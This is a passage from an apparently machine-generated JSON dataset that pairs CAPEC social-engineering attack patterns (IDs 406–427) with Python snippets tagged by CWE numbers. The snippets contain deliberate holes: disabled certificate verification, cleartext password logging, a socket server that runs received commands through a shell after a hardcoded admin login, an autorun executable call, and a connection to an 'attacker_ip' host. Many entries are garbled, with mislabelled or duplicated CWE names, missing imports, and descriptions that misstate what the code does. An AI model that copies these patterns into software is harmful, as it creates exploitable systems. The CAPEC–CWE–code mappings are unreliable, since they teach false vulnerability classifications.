        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo(os.getcwd())\nprint(repo.git.log())\n\n# CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\ncore_dump_file = open('core_dump.log', 'r')\nprint(core_dump_file.read())\n\ncore_dump_file.close()\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nimport socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 12345)\nsock.connect(server_address)\nmessage = 'username:password'\nsock.sendall(message.encode())\n\n# CWE-316: Cleartext Storage of Sensitive Information in Memory\nsensitive_info = 'credit_card_number:1234-5678-9012-3456'\nprint(sensitive_info)\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndef decommission_device(device):\n    # No scrubbing of sensitive data\n    pass\n\ndevice = 'hard_drive'\ndecommission_device(device)",
        "description": "This Python code snippet demonstrates the CAPEC of dumpster diving by exposing sensitive information through various means, including exposing version control repositories, core dump files, transmitting sensitive information in cleartext, storing sensitive information in cleartext in memory, and improperly scrubbing sensitive data from decommissioned devices."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\n# CWE-384: Session Fixation\nsession_id = 'fixed_session_id'\n\n# CWE-300: Channel Accessible by Non-Endpoint\nurl = 'https://example.com/authenticate'\nresponse = requests.post(url, data={'username': 'admin', 'password': 'password'}, cookies={'session_id': session_id})\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\nprint('Login successful! You are now authenticated.')\n\n# CWE-1229: Creation of Emergent Resource\nnew_resource = 'https://example.com/new_resource'\nrequests.post(new_resource, data={'sensitive_info': 'secret_data'})\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nprint('Your sensitive information: ', requests.get(new_resource).text)",
        "description": "This code snippet demonstrates a pretexting attack where an adversary creates an invented scenario to solicit information from a target person. The code fixes a session ID, allowing an attacker to steal authenticated sessions (CWE-384). It then uses a vulnerable channel to authenticate as an admin user (CWE-300). The UI misrepresents critical information, making the user believe they are authenticated (CWE-451). The code then creates a new emergent resource, exposing sensitive information to an unauthorized actor (CWE-1229 and CWE-200)."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# CWE-533: Information Exposure Through Server Log Files\nserver_log = open('server.log', 'a')\nserver_log.write('Sensitive information: {}\n'.format('secret_data'))\nserver_log.close()\n\n# CWE-217: Failure to Protect Stored Data from Modification\nstored_data = {'secret_key': 'secret_value'}\n\n# CWE-218: Failure to provide confidentiality for stored data\nunencrypted_data = 'unencrypted_secret_data'\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\nimport dns.resolver\nresult = dns.resolver.resolve('example.com', 'A')\n\n# CAPEC: Collect and Analyze Information\nimport os\nimport socket\n\nhostname = socket.gethostname()\nip_address = socket.gethostbyname(hostname)\n\n# Collecting system information\nsystem_info = {'hostname': hostname, 'ip_address': ip_address}\n\n# Analyzing system information\nprint('System Information: {}\n'.format(system_info))",
        "description": "This code snippet demonstrates the deprecated CAPEC and CWEs. It includes logging sensitive information to debug and server logs, storing unencrypted data, relying on DNS lookups for security decisions, and collecting system information without proper protection."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\n\ndns_lookup = 'example.com'\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\nif dns_lookup == 'example.com':\n    # Grant access\n    access_granted = True\nelse:\n    # Deny access\n    access_granted = False\n\n# CWE-766: Critical Data Element\n# CWE-767: Critical Data Element\nstored_data = 'sensitive_data'\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\nlogging.debug('Stored data: ' + stored_data)\n\n# CWE-493: Failure to Provide Confidentiality for Stored Data\nwith open('data.txt', 'w') as f:\n    f.write(stored_data)\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that collects and analyzes information. It includes various deprecated CWEs, such as CWE-350 (reliance on DNS lookups in a security decision), CWE-766 and CWE-767 (failure to protect stored data from modification), CWE-532 (information exposure through log files), and CWE-493 (failure to provide confidentiality for stored data). The code performs a DNS lookup to make a security decision, stores sensitive data in a file, and logs the data in a debug log file, exposing it to potential attackers."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import socket\nimport json\n\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n# CWE-940: Improper Verification of Source of a Communication Channel\n\ndef handle_request(request):\n    # Improperly verify the source of the communication channel\n    if 'source' in request:\n        source = request['source']\n    else:\n        source = 'unknown'\n\n    # Truncate security-relevant information\n    truncated_request = {k: v[:10] for k, v in request.items()}\n\n    # Expose sensitive information to an unauthorized actor\n    sensitive_info = {'internal_state': 'active', 'decision_process': 'automatic'}\n    response = {'truncated_request': truncated_request, 'sensitive_info': sensitive_info}\n\n    # Send response back to the client\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('localhost', 8080))\n    client_socket.send(json.dumps(response).encode())\n    client_socket.close()\n\n# Social engineering to extract information\ndef extract_info(target):\n    # Use authentic mimicry and detailed knowledge to increase the success of elicitation attacks\n    context = {'company': 'ABC Corp', 'individual': 'John Doe'}\n    question = 'What is your password, ' + context['individual'] + '?'\n    return input(question)\n\n# Main program\nif __name__ == '__main__':\n    request = {'source': 'localhost', 'data': 'some_data'}\n    handle_request(request)\n    info = extract_info({'company': 'ABC Corp', 'individual': 'John Doe'})\n    print('Extracted info:', info)",
        "description": "This code snippet demonstrates a social engineering attack that extracts sensitive information from a target individual. The handle_request function improperly verifies the source of the communication channel, truncates security-relevant information, and exposes sensitive information to an unauthorized actor. The extract_info function uses authentic mimicry and detailed knowledge to increase the success of elicitation attacks. The main program simulates a social engineering attack by calling the handle_request and extract_info functions."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import os\nimport logging\n\n# CWE-533: Information Exposure Through Server Log Files\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# CWE-592: Authentication Bypass Issues\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.debug('Debug information: username={}, password={}'.format('admin', 'password'))\n\n# CWE-217: Failure to Protect Stored Data from Modification\nstored_data = {'username': 'admin', 'password': 'password'}\n\n# CWE-542: Information Exposure Through Cleanup Log Files\ndef cleanup_log_files():\n    os.remove('server.log')\n    logging.info('Log files cleaned up')\n\n# CAPEC: Social Information Gathering via Pretexting\ndef pretexting_attack():\n    username = input('Enter your username: ')\n    password = input('Enter your password: ')\n    if authenticate(username, password):\n        print('Login successful!')\n        logging.info('Login successful: username={}, password={}'.format(username, password))\n    else:\n        print('Login failed!')\n        logging.error('Login failed: username={}, password={}'.format(username, password))\n\npretexting_attack()\n",
        "description": "This code snippet demonstrates a social engineering attack via pretexting, where an attacker poses as a trusted entity to gather sensitive information from a victim. The code includes deprecated CWEs, such as information exposure through log files, authentication bypass issues, and failure to protect stored data from modification, which can be used to exploit the system."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\n# Create a socket to listen for incoming connections\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nprint('Waiting for connection...')\nconnection, address = server_socket.accept()\nprint('Connected by', address)\n\n# CWE-408: Incorrect Behavior Order: Early Amplification\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Receive data from the client without verifying the source\nwhile True:\n    data = connection.recv(1024)\n    if not data:\n        break\n    print('Received:', data.decode('utf-8'))\n    # Send sensitive information back to the client\n    connection.sendall(b'Your credit card number is: 1234-5678-9012-3456')\n\nconnection.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server that listens for incoming connections and responds with sensitive information without properly verifying the source of the communication channel or the identity of the actor at the other end. This allows an adversary to pretext as a customer service representative and solicit information from the target person or manipulate them into performing an action that serves the adversary's interests."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\n\nusername = input('Enter your username: ')\npassword = input('Enter your password: ')\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n\nfile_path = input('Enter the path to the file you want to upload: ')\nfile_type = os.path.splitext(file_path)[1]\nif file_type in ['.exe', '.dll', '.sys']: \n    print('File uploaded successfully!')\nelse: \n    print('File type not supported. Please try again. ')\n\n# CWE-1263: Improper Physical Access Control\n\n# Assuming the USB thumb drive is plugged in and has a malicious payload\n\nusb_drive_path = '/media/usb'\nif os.path.exists(usb_drive_path): \n    print('USB drive detected! Running autorun file...')\n    os.system('autorun.exe')\nelse: \n    print('No USB drive detected. ')\n\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n\n# Writing sensitive information to an externally-accessible file\n\nwith open('sensitive_info.txt', 'w') as f: \n    f.write(f'Username: {username}\\nPassword: {password}')",
        "description": "This Python code snippet demonstrates a social engineering attack where an adversary, posing as a tech support worker, tricks a user into providing sensitive information and uploading a malicious file. The code exposes sensitive information to an unauthorized actor, allows unrestricted upload of a file with a dangerous type, and inserts sensitive information into an externally-accessible file. The code also assumes physical access to the system, allowing the adversary to run a malicious payload from a USB thumb drive."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "import os\nimport socket\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\n# Create a socket to initiate an outgoing request to an actor\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Incorrectly specify the intended destination for that actor\nsock.connect((\"attacker_ip\", 8080))\n\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n# Place sensitive information into files or directories that are accessible to actors\nf = open(\"delivery_credentials.txt\", \"w\")\nf.write(\"username:password\")\nf.close()\n\n# CWE-433: Unparsed Raw Web Content Delivery\n# Store raw content or supporting code under the web document root with an extension that is not specifically handled by the server\nos.system(\"cp delivery_script.php /var/www/html/\")\n\n# CWE-1292: Incorrect Conversion of Security Identifiers\n# Incorrectly implement a conversion mechanism to map certain bus-transaction signals to security identifiers\nsecurity_id = \"admin\"\nbus_signal = \"0x1234\"\nif bus_signal == \"0x1234\":\n    security_id = \"guest\"",
        "description": "This Python code snippet demonstrates the CAPEC of pretexting as a delivery person to solicit information or manipulate the target into performing an action. It incorporates CWEs 941, 300, 538, 433, and 1292. The code creates a socket to initiate an outgoing request to an actor, incorrectly specifying the intended destination. It then places sensitive information into an externally accessible file and stores raw web content under the web document root. Finally, it incorrectly implements a conversion mechanism to map bus-transaction signals to security identifiers, allowing unauthorized access."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint('Waiting for connection...')\n\n# Accept incoming connection\nconnection, address = server_socket.accept()\n\nprint('Connected by', address)\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-925: Improper Verification of Intent by Broadcast Receiver\n\n# Receive data from the client\ndata = connection.recv(1024)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Send sensitive information back to the client\nconnection.sendall(b'Your sensitive information: ***')\n\nprint('Sensitive information sent.')</code_snippet>",
        "description": "This Python code snippet demonstrates a vulnerable server that accepts incoming connections and sends sensitive information back to the client without properly verifying the identity of the client or ensuring the integrity of the communication channel. This makes it susceptible to pretexting attacks, where an adversary can impersonate a trusted role and manipulate the server into performing an action that serves their interests."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import random\n\ndef get_sensitive_info(user_id, query):\n    # CWE-202: Exposure of Sensitive Information Through Data Queries\n    # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    if user_id in authorized_users:\n        return db.query(query)\n    else:\n        # CWE-205: Observable Behavioral Discrepancy\n        # Delay response to avoid raising suspicion\n        time.sleep(random.uniform(1, 5))\n        return {}\n\ndef create_emergent_resource(user_id):\n    # CWE-1229: Creation of Emergent Resource\n    # Create a new resource that can be used by attackers\n    if user_id in privileged_users:\n        return create_new_resource()\n    else:\n        return None\n\ndef interact_frequently(user_id):\n    # CWE-799: Improper Control of Interaction Frequency\n    # Allow frequent interactions without limiting the number of requests\n    while True:\n        get_sensitive_info(user_id, 'SELECT * FROM sensitive_data')\n        create_emergent_resource(user_id)\n",
        "description": "This code snippet demonstrates a social engineering attack where an adversary manipulates a targeted individual to solicit sensitive information or perform an action that serves the adversary's interests. The code includes vulnerabilities related to exposure of sensitive information, creation of emergent resources, and improper control of interaction frequency."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-654: Reliance on a Single Factor in a Security Decision\n    # Only checking the username, not the password\n    if username == 'admin':\n        return True\n    else:\n        return False\n\n\ndef truncate_security_info(log_data):\n    # CWE-222: Truncation of Security-relevant Information\n    # Truncating log data to hide sensitive information\n    return log_data[:100]\n\n\ndef reflect_attack(auth_token):\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # Reflection attack to impersonate a trusted user\n    return auth_token\n\n\ndef obscure_security_mechanism(password):\n    # CWE-656: Reliance on Security Through Obscurity\n    # Obscure security mechanism using a simple hash\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    return hashed_password\n\n\ndef observable_behavioral_discrepancy(user_input):\n    # CWE-205: Observable Behavioral Discrepancy\n    # Observable difference in behavior based on user input\n    if user_input == 'secret_key':\n        return 'Access granted'\n    else:\n        return 'Access denied'\n",
        "description": "This code snippet demonstrates a social engineering attack where an adversary exploits the target's perception of the relationship between the adversary and themselves. The code includes several vulnerabilities, including reliance on a single factor in a security decision, truncation of security-relevant information, reflection attack in an authentication protocol, reliance on security through obscurity, and observable behavioral discrepancy. These vulnerabilities can be used by the adversary to persuade the target to unknowingly perform an action or divulge information that is advantageous to the adversary."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\nimport json\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a address and port\nserver_socket.bind((\"localhost\", 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint(\"Waiting for a connection...\")\n\n# Accept the connection\nconnection, address = server_socket.accept()\n\nprint(\"Connected by\", address)\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Receive data from the client\ndata = connection.recv(1024)\n\n# Parse the received data as JSON\ndata_json = json.loads(data.decode('utf-8'))\n\n# CWE-222: Truncation of Security-relevant Information\n# Truncate the received data\ntruncated_data = data_json.get('compliment', '')[:10]\n\nprint(\"Received compliment: \", truncated_data)\n\n# Send a response back to the client\nresponse = {\"question\": \"What's your password?\"}\nconnection.sendall(json.dumps(response).encode('utf-8'))\n\n# Close the connection\nconnection.close()",
        "description": "This Python code snippet demonstrates a social engineering attack that exploits a sense of obligation in the target. The server creates a socket and listens for incoming connections. When a connection is established, it receives a compliment from the client and truncates the received data. The server then sends a question back to the client, asking for sensitive information. The code embodies the CAPEC by using social engineering techniques to create a sense of obligation in the target, and the related CWEs by not verifying the identity of the client, not ensuring the integrity of the communication channel, and truncating security-relevant information."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import socket\nimport ssl\nimport OpenSSL\n\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-203: Observable Discrepancy\n\ndef negotiate_algorithm(client_socket, server_socket):\n    algorithms = ['AES-128-CBC', 'AES-256-CBC', 'DES-CBC']\n    client_algorithm = client_socket.recv(1024).decode()\n    if client_algorithm in algorithms:\n        return client_algorithm\n    else:\n        return 'AES-128-CBC'  # default to a weaker algorithm\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation\n\ndef establish_connection(host, port):\n    context = ssl.create_default_context()\n    context.check_hostname = False  # disable hostname verification\n    context.verify_mode = ssl.CERT_NONE  # disable certificate verification\n    client_socket = socket.create_connection((host, port))\n    ssl_client_socket = context.wrap_socket(client_socket, server_hostname=host)\n    return ssl_client_socket\n\n# CWE-436: Interpretation Conflict\n\ndef handle_input(input_data, product):\n    if product == 'A':\n        return input_data.decode('utf-8')\n    elif product == 'B':\n        return input_data.decode('latin-1')\n    else:\n        return input_data.decode('ascii')\n\nhost = 'example.com'\nport = 443\n\nssl_client_socket = establish_connection(host, port)\nalgorithm = negotiate_algorithm(ssl_client_socket, ssl_client_socket)\ninput_data = ssl_client_socket.recv(1024)\noutput = handle_input(input_data, 'A')\nprint(output)\n",
        "description": "This code snippet demonstrates a vulnerable communication channel that is susceptible to various attacks. The negotiate_algorithm function allows the client to specify the encryption algorithm, but defaults to a weaker algorithm if the client's choice is not recognized. The establish_connection function creates an SSL connection with the server, but disables hostname and certificate verification. The handle_input function decodes input data differently based on the product, which can lead to interpretation conflicts. These vulnerabilities can be exploited by an attacker to gain unauthorized access or manipulate the communication channel."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\nimport random\n\nclass LimitedOffer:\n    def __init__(self, resource):\n        self.resource = resource\n        self.limit = 10\n        self.timeout = 300\n\n    def check_availability(self):\n        if random.randint(0, 1):\n            return True\n        else:\n            return False\n\n    def consume_resource(self, user_input):\n        if self.check_availability():\n            if user_input == 'yes':\n                if self.limit > 0:\n                    self.limit -= 1\n                    return 'Resource allocated successfully'\n                else:\n                    return 'Resource unavailable. Try again later'\n            else:\n                return 'Invalid input'\n        else:\n            time.sleep(self.timeout)\n            return 'Service unavailable. Please try again later'\n\noffer = LimitedOffer('premium_account')\nprint(offer.consume_resource(input('Do you want to claim your limited offer? (yes/no): ')))",
        "description": "This code snippet demonstrates a vulnerable implementation of a limited offer system. The system relies on a single factor (random number generation) to determine availability, making it vulnerable to CWE-654. The system also consumes excessive resources (sleep function) without proper authorization, making it vulnerable to CWE-405. The obscurity of the random number generation and the sleep function timing make it vulnerable to CWE-656. The truncation of the error message and the lack of logging make it vulnerable to CWE-222. Finally, the observable behavioral discrepancy in the system's response to different user inputs makes it vulnerable to CWE-205. An adversary can exploit these vulnerabilities to create a sense of urgency and persuade the target to divulge information or perform an action that is advantageous to the adversary."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind(('localhost', 8080))\nsock.listen(1)\n\nconn, addr = sock.accept()\n\n# CWE-654: Reliance on a Single Factor in a Security Decision\n# CWE-222: Truncation of Security-relevant Information\n\nusername = conn.recv(1024).decode().strip()\npassword = conn.recv(1024).decode().strip()\n\nif username == 'admin' and password == 'password':\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # Impersonating an admin user\n    conn.send(b'Authenticated as admin\\n')\n    conn.send(b'Enter command: ')\n    while True:\n        command = conn.recv(1024).decode().strip()\n        if command == 'exit':\n            break\n        # Execute command as admin\n        output = subprocess.check_output(command, shell=True)\n        conn.send(output)\nelse:\n    conn.send(b'Authentication failed\\n')\n",
        "description": "This code snippet demonstrates a vulnerable authentication protocol that can be exploited by an adversary to impersonate an admin user. The server does not properly verify the identity of the client, allowing an attacker to access the channel and send malicious commands. The server also relies on a single factor (username and password) to make a security decision, and truncates security-relevant information (e.g., the source IP address of the client). An attacker can exploit these weaknesses to gain unauthorized access to the system."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\nclass SocialEngineeringProxy:\n    def __init__(self):\n        self.request_count = 0\n        self.request_frequency = {}\n\n    def handle_request(self, url):\n        self.request_count += 1\n        if url not in self.request_frequency:\n            self.request_frequency[url] = 1\n        else:\n            self.request_frequency[url] += 1\n\n        if self.request_count < 5:\n            # Initial requests are allowed\n            return requests.get(url)\n        elif self.request_frequency[url] < 3:\n            # Subsequent requests are allowed if they are not too frequent\n            return requests.get(url)\n        else:\n            # Block requests that exceed the frequency limit\n            return 'Request blocked'\n\n    def get_response(self, url):\n        response = self.handle_request(url)\n        if isinstance(response, str):\n            return response\n        else:\n            # Observable behavioral discrepancy: return different responses based on the request frequency\n            if self.request_frequency[url] % 2 == 0:\n                return response.text\n            else:\n                return response.status_code\n\nproxy = SocialEngineeringProxy()\nprint(proxy.get_response('http://example.com'))",
        "description": "This code snippet demonstrates a social engineering proxy that uses the principles of the CAPEC to manipulate users into performing certain actions. The proxy initially allows a few requests to go through, but then starts blocking requests that exceed a certain frequency. The proxy also exhibits observable behavioral discrepancies by returning different responses based on the request frequency, which can be exploited by an attacker to gather information about the system."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import socket\nimport json\nimport hashlib\n\nclass AuthenticationServer:\n    def __init__(self):\n        self.users = {'admin': 'password123'}\n        self.trusted_users = ['admin']\n\n    def authenticate(self, username, password):\n        if username in self.trusted_users:\n            # CWE-301: Reflection Attack in an Authentication Protocol\n            # CWE-654: Reliance on a Single Factor in a Security Decision\n            return True\n        elif hashlib.sha256(password.encode()).hexdigest() == self.users.get(username):\n            return True\n        else:\n            return False\n\n    def send_sensitive_data(self, username, data):\n        # CWE-205: Observable Behavioral Discrepancy\n        # CWE-656: Reliance on Security Through Obscurity\n        if self.authenticate(username, 'password123'):\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect(('localhost', 8080))\n            sock.send(json.dumps({'username': username, 'data': data}).encode())\n            sock.close()\n\n    def receive_data(self):\n        # CWE-927: Use of Implicit Intent for Sensitive Communication\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('localhost', 8080))\n        sock.listen(1)\n        conn, addr = sock.accept()\n        data = conn.recv(1024).decode()\n        print('Received data:', json.loads(data))\n        conn.close()\n\nserver = AuthenticationServer()\nserver.send_sensitive_data('admin', 'confidential_data')\nserver.receive_data()",
        "description": "This code snippet demonstrates a vulnerable authentication server that relies on a single factor (username) to grant access to sensitive data. The server uses a simple reflection attack to impersonate trusted users, and relies on security through obscurity by using a hardcoded password. The server also uses implicit intents to transmit sensitive data between applications. An attacker can exploit these vulnerabilities to gain unauthorized access to the system."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass AuthenticationProtocol:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n\n    def authenticate(self, input_username, input_password):\n        if input_username == self.username and input_password == self.password:\n            return {'status': 'success', 'message': 'Authenticated successfully'}\n        else:\n            return {'status': 'failure', 'message': 'Invalid credentials'}\n\n    def reflection_attack(self, input_username, input_password):\n        # CWE-301: Reflection Attack in an Authentication Protocol\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        if input_username == self.username:\n            return {'status': 'success', 'message': 'Authenticated successfully'}\n        else:\n            return {'status': 'failure', 'message': 'Invalid credentials'}\n\n    def observable_discrepancy(self, input_username, input_password):\n        # CWE-203: Observable Discrepancy\n        # CWE-205: Observable Behavioral Discrepancy\n        if input_username == self.username and input_password == self.password:\n            return {'status': 'success', 'message': 'Authenticated successfully', 'delay': random.randint(100, 500)}\n        else:\n            return {'status': 'failure', 'message': 'Invalid credentials', 'delay': random.randint(1000, 2000)}\n\n    def equivalent_product_discrepancy(self, input_username, input_password):\n        # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        if input_username == self.username and input_password == self.password:\n            return {'status': 'success', 'message': 'Authenticated successfully', 'product_id': 'ProductA'}\n        else:\n            return {'status': 'failure', 'message': 'Invalid credentials', 'product_id': 'ProductB'}\n",
        "description": "This Python code snippet demonstrates the CAPEC concept of influencing a target's actions by leveraging human nature to assume behavior of others is appropriate. It includes four methods: authenticate, reflection_attack, observable_discrepancy, and equivalent_product_discrepancy. The authenticate method is a simple authentication protocol. The reflection_attack method is vulnerable to CWE-301 and CWE-654. The observable_discrepancy method is vulnerable to CWE-203 and CWE-205. The equivalent_product_discrepancy method is vulnerable to CWE-207. An attacker can exploit these vulnerabilities to influence the target's actions."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import socket\nimport ssl\nimport json\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\ndef create_channel():\n    context = ssl.create_default_context()\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    ssock = context.wrap_socket(sock, server_hostname='example.com')\n    ssock.connect(('example.com', 443))\n    return ssock\n\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n# CWE-654: Reliance on a Single Factor in a Security Decision\n\ndef get_user_input(channel):\n    data = channel.recv(1024).decode('utf-8')\n    # Misrepresent critical information to the user\n    print('Server:', data.replace('https', 'http'))\n    user_input = input('Enter your credentials: ')\n    return user_input\n\n# CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\ndef negotiate_algorithm(channel):\n    algorithms = ['AES-128-CBC', 'AES-256-CBC', 'DES-CBC']\n    # Select a less-secure algorithm\n    algorithm = min(algorithms, key=len)\n    channel.send(json.dumps({'algorithm': algorithm}).encode('utf-8'))\n    return algorithm\n\nchannel = create_channel()\nuser_input = get_user_input(channel)\nnegotiate_algorithm(channel)\nchannel.send(user_input.encode('utf-8'))",
        "description": "This code snippet demonstrates a vulnerable communication channel that embodies the main idea of the CAPEC. It creates a TLS connection without verifying the server's identity, misrepresents critical information to the user, relies on a single factor for security decisions, and selects a less-secure algorithm for encryption. The code is designed to be exploited by an adversary using framing techniques to influence the user's decisions."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "import os\nimport socket\nimport random\n\n# CWE-941 Incorrectly Specified Destination in a Communication Channel\n# CWE-656 Reliance on Security Through Obscurity\n\nsecret_key = os.urandom(16)  # Obscure key, but not secure\n\n# CWE-654 Reliance on a Single Factor in a Security Decision\ndef authenticate(user, password):\n    if password == 'password123':  # Single factor authentication\n        return True\n    return False\n\n# CWE-405 Asymmetric Resource Consumption (Amplification)\ndef send_data(destination):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((destination, 8080))\n    data = 'A' * 1024 * 1024  # Send large amount of data\n    sock.sendall(data.encode())\n    sock.close()\n\n# CWE-1229 Creation of Emergent Resource\n# Create a new resource (file) that can be used by attackers\nf = open('resource.txt', 'w')\n\n# CAPEC: Manipulating something of influence (financial incentivization)\ndef manipulate_influence(user):\n    if authenticate(user, 'password123'):\n        reward = 1000  # Financial incentivization\n        print(f'User {user} has been rewarded {reward} dollars!')\n        send_data('example.com')  # Send data to a destination\n        f.write(f'User {user} has been rewarded {reward} dollars!\\n')\n    else:\n        print('Authentication failed!')\n\nmanipulate_influence('john')",
        "description": "This code snippet demonstrates the CAPEC of manipulating something of influence (financial incentivization) by using various CWEs. It includes incorrectly specifying a destination in a communication channel, reliance on security through obscurity, reliance on a single factor in a security decision, asymmetric resource consumption, and creation of an emergent resource. The code manipulates the user by offering a financial reward, which can be exploited by an attacker."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # CWE-654: Reliance on a Single Factor in a Security Decision\n    if username == 'admin' and hashlib.sha256(password.encode()).hexdigest() == 'hashed_admin_password':\n        return True\n    else:\n        return False\n\n\ndef get_security_info(username):\n    # CWE-222: Truncation of Security-relevant Information\n    security_info = get_security_data_from_database(username)\n    return security_info[:100]  # truncate security info to 100 characters\n\n\ndef define_control_sphere(username):\n    # CWE-673: External Influence of Sphere Definition\n    control_sphere = {}\n    control_sphere['username'] = username\n    control_sphere['permissions'] = get_permissions_from_external_source(username)\n    return control_sphere\n\n\ndef observe_behavior(username):\n    # CWE-205: Observable Behavioral Discrepancy\n    behavior_data = get_behavior_data_from_database(username)\n    if behavior_data['login_attempts'] > 5:\n        return 'suspicious'\n    else:\n        return 'normal'",
        "description": "This code snippet demonstrates a vulnerable authentication system that relies on a single factor (hashed password) for security decisions, truncates security-relevant information, allows external influence of control sphere definition, and observes behavioral discrepancies. An attacker can exploit these weaknesses to impersonate a trusted user, gain unauthorized access, or influence the system's behavior."
